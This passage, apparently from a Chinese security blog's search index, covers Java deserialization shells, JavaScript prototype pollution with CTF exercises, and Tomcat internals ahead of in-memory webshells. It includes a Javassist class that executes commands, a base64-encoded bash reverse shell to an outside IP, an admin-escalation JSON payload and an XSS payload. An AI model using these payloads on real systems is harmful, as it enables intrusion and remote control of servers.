pool.makeClass(\"Evil\");  \n        CtClass superClass = pool.get(\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\");  \n        ctClass.setSuperclass(superClass);  \n        CtConstructor constructor = ctClass.makeClassInitializer();  \n        constructor.setBody(\" try &#123;\\n\" +  \n                \" Runtime.getRuntime().exec(\\\"\" + cmd +  \n\"\\\");\\n\" +\n                \" &#125; catch (Exception ignored) &#123;\\n\" +  \n                \" &#125;\");  \n        // \"new String[]&#123;\\\"/bin/bash\\\", \\\"-c\\\", \\\"&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\\\"&#125;\"  \n byte[] bytes = ctClass.toBytecode();  \n        ctClass.defrost();  \n        return bytes;  \n    &#125; catch (Exception e) &#123;  \n        e.printStackTrace();  \n        return new byte[]&#123;&#125;;  \n    &#125;  \n&#125;\n\n这里弹成功了，舒畅\n\n\n0x05 关于 ysoserial 改写的踩坑点其实这和之前我讲的弹 shell 要的注意点是大同小异的，可以参考书鱼师傅的这篇文章\nhttps://ctf.org.cn/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/\n","categories":["踩坑合集"],"tags":["踩坑合集"]},{"title":"Java 踩坑小记","url":"/2022/09/06/Java-%E8%B8%A9%E5%9D%91%E5%B0%8F%E8%AE%B0/","content":"Java 踩坑小记\n\nJava 踩坑合集关于 Servlet 项目创建的问题具体可见 Servlet 项目搭建\n记得要用 maven 打 Tomcat 的依赖，血的教训（悲\nTomcat 1099 端口被占用netstat -aon|findstr 1099\n\n再杀进程即可。\n关于修改文件夹颜色的坑这个也不知道该不该写，怎么说呢……………… 难受了很久，有问题的师傅们私信我叭\n\n\n创建类报错\n我这个情况是属于类名有点问题了\n\n\n\n换个名字吧，目前没有看到很好的方法。\nIDEA Project 文件夹无了把项目里面的 .idea 删掉，再用 IDEA 打开即可\nmaven 编译失败太坑了，是因为包里面的依赖不同，把 repo 里面所有的东西删了就好了。md\nJava 环境如何弄都无法修改这个是真的坑…………………………\n原因是在最早，安装某版本的 Java 的时候，选了某个选项，然后无论怎么设置 JAVA_HOME 都无法改变了\n解决方法：删除 java.exe；javaw.exe；javav.exe 即可………………\n","categories":["踩坑合集"],"tags":["踩坑合集"]},{"title":"JavaScript 原型链污染","url":"/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","content":"nodejs 原型链污染\n\n0x01 前言最近真是忙滴焦头烂额，一堆事儿…… 因为也一直在看产品类的东西，所以学习也进入了一个瓶颈，今天打算先学点新东西。\n大部分内容参考自 lx56 师傅的博客 https://blog.lxscloud.top/2022/11/13/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/\n0x02 前置基础知识JavaScriptJavaScript（简称“JS”） 是一种具有函数优先的轻量级，解释型或即时编译型的编程语言。虽然它是作为开发Web页面的脚本语言而出名，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式、声明式、函数式编程范式，是一门前端语言。\nNodeJSNode.js发布于2009年5月，由Ryan Dahl开发，是一个基于Chrome V8引擎的JavaScript运行环境，使用了一个事件驱动、非阻塞式I&#x2F;O模型， 让JavaScript 运行在服务端的开发平台，它让JavaScript成为与 PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。\n简单来说是一门后端语言，可以解释 JavaScript\n1. JavaScript 数据类型let 和 var 关键字的区别使用 var 或 let 关键字可以定义变量\nlet 和 var 的区别如下：\n\nvar 是全局作用域，let 只在当前代码块内有效\n当在代码块外访问 let 声明的变量时会报错\nvar 有变量提升，let 没有变量提升\nlet 必须先声明再使用，否则报 Uncaught ReferenceError xxx is not defined；var 可以在声明前访问，只是会报 undefined\nlet 变量不能重复声明，var 变量可以重复声明\n\n普通变量var x=5;\nvar y=6;\nvar z=x+y;\nvar x,y,z=1;\n\nlet x=5;\n\n数组变量var a = new Array();\nvar a = [];\n\n字典var a = &#123;&#125;;\nvar a = &#123;\"foo\":\"bar\"&#125;;\n\n2. JavaScript 函数在 Javascript 中，函数使用 function 关键字来进行声明\n函数声明声明一个函数 example\nfunction myFunction() &#123;\n\n&#125;\n\n里面可传参可返回值\nfunction myFunction(a) &#123;\n\treturn a;\n&#125;\n\n匿名函数直接调用匿名函数\n(function(a)) &#123;\n\tconsole.log(a);\n&#125;)(123);\n\n还可以把变量设成函数，调用 fn() 即调用了匿名函数的功能\nvar fn = function() &#123;\n\treturn \"将匿名函数赋值给变量\"\n&#125;\n\n闭包假设在函数内部新建了一个变量，函数执行完毕之后，函数内部这个独立作用域或（封闭的盒子）就会删除，此时这个新建变量也会被删除。（有点像 PHP GC 回收机制）\n如何令这个封闭的盒子是不会删除？可以使用“闭包”的方法（闭包涉及函数作用域、内存回收机制、作用域继承）\n闭包后，内部函数可以访问外部函数作用域的变量，而外部的函数不能直接获取到内部函数的作用域变量\n\n例如不使用额外的全局变量，实现一个计数器\n因为 add 变量指定了函数自我调用的返回值(可以理解为计数器值保存在了 add 中), 每次调用值都加一而不是每次都是 1\nvar add = (function () &#123;\n    var counter = 0;\n    return function () &#123;return counter += 1;&#125;\n&#125;)();\n\n\n\n3. JavaScript 类在以前，如果要定义一个类，需要以定义“构造函数”的方式来定义，例如\nfunction newClass() &#123;\n    this.test = 1;\n&#125;\n\nvar newObj = new newClass();\n\n如果想添加一些方法呢？可以在内部使用构造方法\nfunction newClass() &#123;\n    this.test = 123;\n    this.fn = function() &#123;\n        return this.test;\n    &#125;\n&#125;\n\nvar newObj = new newClass();\nnewObj.fn();\n\n\n\n为了简化编写 JavaScript 代码，ECMAScript 6 后增加了class语法\nclass 关键字可以使用 class 关键字来创建一个类\n形式如下（如果不定义构造方法，JavaScript 会自动添加一个空的构造方法）\nclass ClassName &#123;\n  constructor() &#123; ... &#125;\n&#125;\n\n例子class myClass &#123;\n  //newClass的构造方法如下\n  constructor(a) &#123;\n    this.test = a;//含有一个test属性，值为构造时传入的参数\n  &#125;\n&#125;\n\n使用 new 创建对象let testClass = new myClass(\"testtest\");\n\n测试查看 testClass 对象的 test 属性的值，为 testtest\nconsole.log(testClass.test);\n\n\n\n往对象添加属性直接使用 . 属性名即可，例如向 testClass 添加 aaa 属性\ntestClass.aaa = 333;\n\n\n\n类的方法形式如下\nclass ClassName &#123;\n  constructor() &#123; ... &#125;\n  method_1() &#123; ... &#125;\n  method_2() &#123; ... &#125;\n  method_3() &#123; ... &#125;\n&#125;\n\n4. NodeJS 的简单使用\n安装 NodeJS express 服务器\n\nnpm install express --save-dev\n\n\n编写一段源代码\n\n/*\n* 引入express框架，使用require函数传递形参 'express' 进行引入，\n* 其实在 let 的后面的名称可以自己定义即可\n*/\nlet express = require('express');\n\n/*\n* 使用引入进来的express框架的变量名express来构建一个web服务器实例，\n* 名叫myWeb，也可自定义实例名称\n*/\nlet myWeb = new express();\n\n/*\n* 往实例 myWeb 的调用函数use传入指定的网络路径和自己编写的响应中间件（其实就是一个函数），\n* 这就是服务器的接口的编写方式\n*/\nmyWeb.use(\"/\",function(req,res)&#123;\n\tres.send(\"Hello, NodeJS and express!\");\n\tres.end();\n&#125;);\n\nmyWeb.listen(5000,function()&#123;\n\t//这里可以输入服务器启动成功后要执行的代码，如启动是否成功等终端输出提示，一般这个回调函数可有可无\n\n&#125;);\n写完代码后运行 server\nnode ezWebServer.js\n\n\n\n0x03 原型链污染1. 什么是原型（JavaScript 原型链继承）这里的原型指的是 prototype，比如说上面前言部分讲的 JavaScript 类那里\n我们使用 new 新建了一个 newClass 对象给 newObj 变量\nfunction newClass() &#123;\n    this.test = 1;\n&#125;\n\nvar newObj = new newClass();\n\n实际上这个 newObj 变量使用了原型（prototype）来实现对象的绑定【而不是绑定在“类”中，与 JavaScript 的特性有关，它的“类”与其它语言(例如 JAVA、C++)类不同，它的“类”基于原型】\nprototype 是 newClass 类的一个属性，而所有用 newClass 类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法（这里和 Java 反射的概念挺像的），如下\n\n\n简单来说就是：\n\nprototype 是 newClass 类的一个属性\nnewClass 类实例化的对象 newObj 不能访问 prototype，但可以通过.__proto__ 来访问 newClass 类的 prototype\nnewClass 实例化的对象 newObj 的 .__proto__ 指向 newClass 类的 prototype\n\n这其实就导致了“未授权”的出现，用这一段代码来表示更为直观\n\n\n\n关系可以用这一张图来表示\n\n\n\n2. 原型链污染原理现在已经知道实例化的对象的 .__proto__ 指向类的 prototype\n那么修改了实例化的对象的 .__proto__ 的内容, 类的 prototype 的内容是否也会发生改变？\n答案是肯定的，这就是原型链污染的利用方法。\n这其实就有点像在上 C 语言或者其他编程语言课的时候，老师很喜欢说 copy 与 merge，被 new 出来的实例会影响到本身那一个对象，途径是 .__proto__ 方法。\n3. 哪些情况下原型链会被污染在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？\n我们思考一下，哪些情况下我们可以设置 __proto__ 的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：\n\n对象 merge\n对象 clone（其实内核就是将待操作的对象 merge 到一个空对象中）\n\n以对象 merge 为例，我们想象一个简单的 merge 函数：\nfunction merge(target, source) &#123;\n    for (let key in source) &#123;\n        if (key in source &amp;&amp; key in target) &#123;\n            merge(target[key], source[key])\n        &#125; else &#123;\n            target[key] = source[key]\n        &#125;\n    &#125;\n&#125;\n\n在合并的过程中，存在赋值的操作 target[key] = source[key]，那么，这个 key 如果是 __proto__，是不是就可以原型链污染呢？\n我们用如下代码实验一下：\nlet o1 = &#123;&#125;\nlet o2 = &#123;a: 1, \"__proto__\": &#123;b: 2&#125;&#125;\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 = &#123;&#125;\nconsole.log(o3.b)\n\n结果是，合并虽然成功了，但原型链没有被污染：\n\n\n这是因为，我们用 JavaScript 创建 o2 的过程（let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;）中， __proto__ 已经代表 o2 的原型了，此时遍历 o2 的所有键名，你拿到的是 [a, b]，__proto__并不是一个key，自然也不会修改 Object 的原型。\n那么，如何让 __proto__ 被认为是一个键名呢？\n我们将代码改成如下：\nlet o1 = &#123;&#125;\nlet o2 = JSON.parse('&#123;\"a\": 1, \"__proto__\": &#123;\"b\": 2&#125;&#125;')\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 = &#123;&#125;\nconsole.log(o3.b)\n\n可见，新建的 o3 对象，也存在 b 属性，说明 Object 已经被污染：\n\n\n这是因为，JSON 解析的情况下，__proto__ 会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历 o2 的时候会存在这个键。\nmerge 操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。\n4. 原型链污染例题\n例题一、CatCTF 2022 wife（越权）\n\n一道简单的 js 原型链污染，造成的漏洞是越权。题目逻辑很简单，要邀请码才能注册为admin，普通用户只能拿到 wife，没有 flag。\n看一下注册的逻辑 \napp.post('/register', (req, res) => &#123;\n    let user = JSON.parse(req.body)\n    if (!user.username || !user.password) &#123;\n        return res.json(&#123; msg: 'empty username or password', err: true &#125;)\n    &#125;\n    if (users.filter(u => u.username == user.username).length) &#123;\n        return res.json(&#123; msg: 'username already exists', err: true &#125;)\n    &#125;\n    if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) &#123;\n        user.isAdmin = false\n        return res.json(&#123; msg: 'invalid invite code', err: true &#125;)\n    &#125;\n    let newUser = Object.assign(&#123;&#125;, baseUser, user)\n    users.push(newUser)\n    res.json(&#123; msg: 'user created successfully', err: false &#125;)\n&#125;)\n\n稍微搜一下 Object.assign 可以发现这个方法是可以触发原型链污染的，然后污染 __proto__.isAdmin 为 true 就可以了。当然这个题目当时是黑盒，所以需要 fuzz 一下，不放 hint 相当难做。\n贴一个 payload\n&#123;\"__proto__\":&#123;\"isAdmin\":true&#125;\n\n\n如此便可以造成越权，拿到 flag\n\n\n例题2、通过原型链污染的 http://prompt.ml/13 一道 xss 攻击\n\n以下摘自 https://xz.aliyun.com/t/7182\n源代码\n function escape(input) &#123;\n    // extend method from Underscore library\n    // _.extend(destination, *sources) \n    function extend(obj) &#123;\n        var source, prop;\n        for (var i = 1, length = arguments.length; i &lt; length; i++) &#123;\n            source = arguments[i];\n            for (prop in source) &#123;\n                obj[prop] = source[prop];\n            &#125;\n        &#125;\n        return obj;\n    &#125;\n    // a simple picture plugin\n    try &#123;\n        // pass in something like &#123;\"source\":\"http://sandbox.prompt.ml/PROMPT.JPG\"&#125;\n        var data = JSON.parse(input);\n        var config = extend(&#123;\n            // default image source\n            source: 'http://placehold.it/350x150'\n        &#125;, JSON.parse(input));\n        // forbit invalid image source\n        if (/[^\\w:\\/.]/.test(config.source)) &#123;\n            delete config.source;\n        &#125;\n        // purify the source by stripping off \"\n        var source = config.source.replace(/\"/g, '');\n        // insert the content using mustache-ish template\n        return '&lt;img src=\"&#123;&#123;source&#125;&#125;\">'.replace('&#123;&#123;source&#125;&#125;', source);\n    &#125; catch (e) &#123;\n        return 'Invalid image data.';\n    &#125;\n&#125;\n\n我们分析下题目：\nfunction extend(obj) &#123;\n        var source, prop;\n        for (var i = 1, length = arguments.length; i &lt; length; i++) &#123;\n            source = arguments[i];\n            for (prop in source) &#123;\n                obj[prop] = source[prop];\n            &#125;\n        &#125;\n        return obj;//返回修改后的对象\n    &#125;\n\n这个函数 extends 可以接收多个参数,然后赋值给了 source 变量，接着就对 obj 对象的键值进行了赋值操作，这个函数是可以导致原型污染链攻击的，但是具体怎么攻击我们还不知道，继续分析下去。\nvar data = JSON.parse(input); //这里获取输入并且进行json解析\n        var config = extend(&#123;\n            // default image source\n            source: 'http://placehold.it/350x150'\n        &#125;, JSON.parse(input)); //这里传入了漏洞函数,正常操作就是替换默认的image Source\n        // forbit invalid image source\n        if (/[^\\w:\\/.]/.test(config.source)) &#123; //这里只能允许字母数字\\ .字符,否则delete掉\n            delete config.source;\n        &#125;\n        // purify the source by stripping off \"\n        var source = config.source.replace(/\"/g, '');//这里为了防止逃逸过滤了\"\n        // insert the content using mustache-ish template\n        return '&lt;img src=\"&#123;&#123;source&#125;&#125;\">'.replace('&#123;&#123;source&#125;&#125;', source);//这里拼接了source,这里是xss的点\n\n简单来说，需要我们传参传入 source 触发 xss，所以这里我们不妨采用原型链污染的方式去污染  config.__proto__[&#39;source&#39;] 试一试\n\n\n可以看到的确可以这样子玩的,不过这里还有个&quot;的过滤,\n&#123;\"source\":\"%\",\"__proto__\": &#123;\"source\": \"123'\"&#125;&#125;\n\n这样我们就能逃逸出第一个正则了,但是绕过 &quot;,我们可以考虑下 replace 一些性质\n'&lt;img src=\"&#123;&#123;source&#125;&#125;\">'.replace('&#123;&#123;source&#125;&#125;', source);\n\n我们看下文档:\n\n字符串 stringObject 的 replace() 方法执行的是查找并替换的操作。它将在 stringObject 中查找与 regexp 相匹配的子字符串，然后用 replacement 来替换这些子串。如果 regexp 具有全局标志 g，那么 replace() 方法将替换所有匹配的子串。否则，它只替换第一个匹配子串。\nreplacement 可以是字符串，也可以是函数。如果它是字符串，那么每个匹配都将由字符串替换。但是 replacement 中的 $ 字符具有特定的含义。如下表所示，它说明从模式匹配得到的字符串将用于替换。\n\n\n\n我们可以利用第二个参数做点事情：\n'123'.replace(\"2\",'$`');\n\"113\"\n'123'.replace(\"2\",\"$'\");\n\"133\"\n\n利用RegExp对象的 &quot; 来闭合自己\n最终payload:\n&#123;\"source\":\"%\",\"__proto__\": &#123;\"source\": \"$` onerror=prompt(1)>&lt;!--\"&#125;&#125;\n\n\n\n0x04 原型链污染的 rce 与调试分析","categories":["web安全"],"tags":["web安全"]},{"title":"Java内存马系列-01-基础内容学习","url":"/2022/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-01-%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/","content":"Tomcat 架构学习\n\n\n0x01 前言\n为了给学内存 🐎 打下一个良好的基础，先看一看 Tomcat 架构。\n\n0x02 Java Web 三大件在讲 Tomcat 之前，我们先讲一讲 Java Web 三大件，也就是 Servlet，Filter，Listener\n当 Tomcat 接收到请求时候，依次会经过 Listener -&gt; Filter -&gt; Servlet\nServlet什么是 ServletJava Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。\n它在应用程序中一般在这个位置，我个人把它理解成半个中间件，不同于其他业务性能很强的中间件，\n\n\n请求的处理过程客户端发起一个 http 请求，比如 get 类型。\nServlet 容器接收到请求，根据请求信息，封装成 HttpServletRequest 和HttpServletResponse 对象。这步也就是我们的传参。\nServlet容器调用 HttpServlet 的 init() 方法，init 方法只在第一次请求的时候被调用。\nServlet 容器调用 service() 方法。\nservice() 方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。\ndoXXX 方法中是我们自己写的业务逻辑。\n业务逻辑处理完成之后，返回给 Servlet 容器，然后容器将结果返回给客户端。\n容器关闭时候，会调用 destory 方法。\n\n一整个流程如果用代码来表示的话应该是这样的\n\npackage tomcatShell.Servlet;  \n  \nimport javax.servlet.*;  \nimport javax.servlet.annotation.WebServlet;  \nimport java.io.IOException;  \n  \n// 基础恶意类  \n@WebServlet(\"/servlet\")  \npublic class ServletTest implements Servlet &#123;  \n    @Override  \n public void init(ServletConfig config) throws ServletException &#123;  \n  \n    &#125;  \n  \n    @Override  \n public ServletConfig getServletConfig() &#123;  \n        return null;  \n &#125;  \n  \n    @Override  \n public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;  \n    &#125;  \n  \n    @Override  \n public String getServletInfo() &#123;  \n        return null;  \n &#125;  \n  \n    @Override  \n public void destroy() &#123;  \n  \n    &#125;  \n&#125;\n\nservlet生命周期1）服务器启动时 (web.xml 中配置 load-on-startup&#x3D;1，默认为 0)或者第一次请求该 servlet 时，就会初始化一个 Servlet 对象，也就是会执行初始化方法 init(ServletConfig conf)。\n2）servlet 对象去处理所有客户端请求，在 service(ServletRequest req，ServletResponse res) 方法中执行\n3）服务器关闭时，销毁这个 servlet 对象，执行 destroy() 方法。\n4）由 JVM 进行垃圾回收。\nFilterFilter 简介filter 也称之为过滤器，是对 Servlet 技术的一个强补充，其主要功能是在 HttpServletRequest 到达 Servlet 之前，拦截客户的 HttpServletRequest ，根据需要检查 HttpServletRequest，也可以修改 HttpServletRequest 头和数据；在 HttpServletResponse 到达客户端之前，拦截 HttpServletResponse ，根据需要检查 HttpServletResponse，也可以修改 HttpServletResponse 头和数据。\n工作原理如图所示\n\n\n\n其实这个地方，我们想办法在 Filter 前自己创建一个 filter 并且将其放到最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell\n\n基本工作原理1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。\n2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。\n3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。\n4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。\n5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。\n6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。\n\n简单理解的话，就是后面这几点\n\n其实就是 Filter 中的 Filter 访问需要在 web.xml 里面定义路径，这就非常人性化，因为有些接口我们需要加 Filter，有些不用。\nFilter 有一条 FilterChain，也就是由多个 Filter 组成的，会进行一个个的 Filter 操作，最后一个 Filter 最后会执行 Servlet.service()\n用代码理解的内容会在 Filter 内存马里面讲到 ———— Java内存马系列-03-Tomcat 之 Filter 型内存马\nFilter 的生命周期与 servlet 一样，Filter 的创建和销毁也由 Web 容器负责。Web 应用程序启动时，Web 服务器将创建 Filter 的实例对象，并调用其 init() 方法，读取 web.xml 配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter 对象只会创建一次，init 方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。 Filter 对象创建后会驻留在内存，当 Web 应用移除或服务器停止时才销毁。在 Web 容器卸载 Filter 对象之前被调用。该方法在 Filter 的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。\n后续我们看调试就知道了，这样讲太空洞，个人理解：先去 web.xml 里面找接口 —&gt; init() —&gt; 执行 doFilter() —&gt; destory()\n代码的话，看这个就很清楚了\npackage EvilFliter;  \n  \nimport javax.servlet.*;  \nimport java.io.IOException;  \n  \npublic class FilterTest implements Filter &#123;  \n    @Override  \n    public void init(FilterConfig filterConfig) throws ServletException &#123;  \n  \n    &#125;  \n  \n    @Override  \n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;  \n        // 在这里面进行 doGet 和 doPost 这种类似的  \n &#125;  \n  \n    @Override  \n    public void destroy() &#123;  \n  \n    &#125;  \n&#125;\n\nFilter链当多个 Filter 同时存在的时候，组成了 Filter 链。Web 服务器根据 Filter 在 web.xml 文件中的注册顺序，决定先调用哪个 Filter。当第一个 Filter 的 doFilter 方法被调用时，web服务器会创建一个代表 Filter 链的 FilterChain 对象传递给该方法，通过判断 FilterChain 中是否还有 Filter 决定后面是否还调用 Filter。\n如图\n\n\n\n这个在后续的 Filter 流程分析里面也会细讲\n\nListener简介Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。\nServletContextListener：对Servlet上下文的创建和销毁进行监听； ServletContextAttributeListener：监听 Servlet 上下文属性的添加、删除和替换；\nHttpSessionListener：对 Session 的创建和销毁进行监听。Session 的销毁有两种情况，一个中 Session 超时，还有一种是通过调用 Session 对象的 invalidate() 方法使 session 失效。\nHttpSessionAttributeListener：对 Session 对象中属性的添加、删除和替换进行监听；\nServletRequestListener：对请求对象的初始化和销毁进行监听； ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。\n用途可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。\n0x03 Tomcat 基础介绍什么是 Tomcat大概可以通过对标 Apache 来看一看。\nApache 是 Web 服务器（静态解析，如 HTML），Tomcat 是 java 应用服务器（动态解析，如 JSP）\nTomcat 只是一个 servlet (jsp 也翻译成 servlet)容器，可以认为是 Apache 的扩展，但是可以独立于 Apache 运行。\n\n一句话概括一下，就是 Web 服务器，比较不稳定，但是业务能力比较强。\n\nTomcat 与 Servlet 的关系我们根据上面的基础知识可以知道 Tomcat 是 Web 应用服务器，是一个 Servlet&#x2F;JSP 容器，而 Servlet 容器从上到下分别是  Engine、Host、Context、Wrapper。\n在 Tomcat 中 Wrapper 代表一个独立的 servlet 实例， StandardWrapper 是 Wrapper 接口的标准实现类（StandardWrapper 的主要任务就是载入 Servlet 类并且进行实例化），同时其从 ContainerBase 类继承过来，表示他是一个容器，只是他是最底层的容器，不能再含有任何的子容器了，且其父容器只能是 context。而我们在也就是需要在这里去载入我们自定义的 Servlet 加载我们的内存马。\n0x04 Tomcat 架构Tomcat 架构原理Tomcat 的框架如下图所示，主要有 server、service、connector、container 四个部分\n\n\n图中可以看出 Tomcat 的心脏是两个组件：Connector 和 Container：Connector 主要负责对外交流，进行 Socket 通信(基于 TCP&#x2F;IP)，解析 HTTP 报文，对应下图中的http服务器；\nContainer 主要处理 Connector 接受的请求，主要是处理内部事务，加载和管理 Servlet，由 Servlet 具体负责处理 Request 请求，对应下图中的 servlet 容器。\n\n\nserver即服务器，代表整个 Tomcat 服务器，它要能够提供一个接口让其它程序能够访问到这个 Service 集合、同时要维护它所包含的所有 Service 的生命周期，包括如何初始化、如何结束服务、如何找到别人要访问的 Service。还有其它的一些次要的任务，如您住在这个地方要向当地政府去登记啊、可能还有要配合当地公安机关日常的安全检查什么的。\n一个 Tomcat 只有一个 Server Server 中包含至少一个 Service 组件，用于提供具体服务。\nserviceService 主要是为了关联 Connector 和 Container，同时会初始化它下面的其它组件，在 Connector 和 Container 外面多包一层，把它们组装在一起，向外面提供服务，一个 Service 可以设置多个 Connector，但是只能有一个 Container 容器。\nTomcat 中 Service 接口的标准实现类是 StandardService ，它不仅实现了 Service 借口同时还实现了 Lifecycle 接口，这样它就可以控制它下面的组件的生命周期了\nconnecterConnector 组件是 Tomcat 中两个核心组件之一，它的主要任务是负责接收浏览器的发过来的 tcp 连接请求，创建一个 Request 和 Response 对象分别用于和请求端交换数据，然后会产生一个线程来处理这个请求并把产生的 Request 和 Response 对象传给处理这个请求的线程，处理这个请求的线程就是 Container 组件要做的事了。\n根据运行的逻辑图，我们也能看到连接器 connector 主要有三个功能：\n\nsocket 通信解析处理应用层协议，如将 socket 连接封装成 request 和 response 对象，后续交给 Container 来处理将 Request 转换为 ServletRequest，将 Response 转换为 ServletResponse\n\n这些，其实在 shiro 开发的过程当中也是用到这个了的，而且当时我记得还特别容易写错类名。\n其中 Tomcat 设计了三个组件，其负责功能如下：\n\nEndPoint: 负责网络通信，将字节流传递给 Processor；\nProcessor: 负责处理字节流生成 Tomcat Request 对象，将 Tomcat Request 对象传递给 Adapter；\nAdapter: 负责将 Tomcat Request 对象转化成 ServletRequest 对象，传递给容器。\n\nAdapter 组件由于协议的不同，Tomcat 定义了自己的 Request 类来存放请求信息，但是这个不是标准的 ServletRequest。于是需要使用 Adapter 将 Tomcat Request 对象转成 ServletRequest 对象，然后就能调用容器的 service 方法。\n简而言之，Endpoint 接收到 Socket 连接后，生成一个 SocketProcessor 任务提交到线程池进行处理，SocketProcessor 的 run 方法将调用 Processor 组件进行应用层协议的解析，Processor 解析后生成 Tomcat Request 对象，然后会调用 Adapter 的 Service 方法，方法内部通过如下代码将 Request 请求传递到容器中。\nconnector.getService().getContainer().getPipeline().getFirst().invoke(request, response);\n\n一个总的 Tomcat Connector 功能如图所示\n\n\nContainerContainer（又名Catalina）用于处理Connector发过来的servlet连接请求，它是容器的父接口，所有子容器都必须实现这个接口，Container 容器的设计用的是典型的责任链的设计模式，它有四个子容器组件构成，分别是：Engine、Host、Context、Wrapper，这四个组件不是平行的，而是父子关系，Engine 包含 Host，Host 包含 Context，Context 包含 Wrapper。\nTomcat 设计了 4 种容器: Engine、Host、Context、Wrapper ，这四种容器是父子关系\n\nEngine: 最顶层容器组件，可以包含多个 Host。实现类为 org.apache.catalina.core.StandardEngine\nHost: 代表一个虚拟主机，每个虚拟主机和某个域名 Domain Name 相匹配，可以包含多个 Context。实现类为 org.apache.catalina.core.StandardHost\nContext: 一个 Context 对应于一个 Web 应用，可以包含多个 Wrapper。实现类为 org.apache.catalina.core.StandardContext \nWrapper: 一个 Wrapper 对应一个 Servlet。负责管理 Servlet ，包括 Servlet 的装载、初始化、执行以及资源回收。实现类为 org.apache.catalina.core.StandardWrapper\n\n通常一个 Servlet class 对应一个 Wrapper，如果有多个 Servlet 就可以定义多个 Wrapper，如果有多个 Wrapper 就要定义一个更高的 Container。\n举个🌰，a.com和b.com分别对应着两个Host\n  \n每一个 Context 都有唯一的 path。这里的 path 不是指 servlet 绑定的 WebServlet 地址，而是指独立的一个 Web 应用地址。就好比 Tomat 默认的 &#x2F; 地址和 &#x2F;manager 地址就是两个不同的 web 应用，所以对应两个不同的 Context。要添加 Context 需要在 server.xml 中配置 docbase。 \n如下图所示， 在一个 web 应用中创建了 2 个 servlet 服务，WebServlet 地址分别是 &#x2F;Demo1 和 &#x2F;Demo2 。 因为它们属于同一个 Web 应用所以 Context 一样，但访问地址不一样所以 Wrapper 不一样。 &#x2F;manager 访问的 Web 应用是 Tomcat 默认的管理页面，是另外一个独立的 web 应用， 所以 Context 与前两个不一样。\n \n\n0x05 Tomcat 的类加载机制由于 Tomcat 中有多个 WebApp 同时要确保之间相互隔离，所以 Tomcat 的类加载机制也不是传统的双亲委派机制。\nTomcat 自定义的类加载器 WebAppClassloader 为了确保隔离多个 WebApp 之间相互隔离，所以打破了双亲委托机制。每个 WebApp 用一个独有的 ClassLoader 实例来优先处理加载。它首先尝试自己加载某个类，如果找不到再交给父类加载器，其目的是优先加载 WEB 应用自己定义的类。\n同时为了防止 WEB 应用自己的类覆盖 JRE 的核心类，在本地 WEB 应用目录下查找之前，先使用 ExtClassLoader（使用双亲委托机制）去加载，这样既打破了双亲委托，同时也能安全加载类。\n0x06 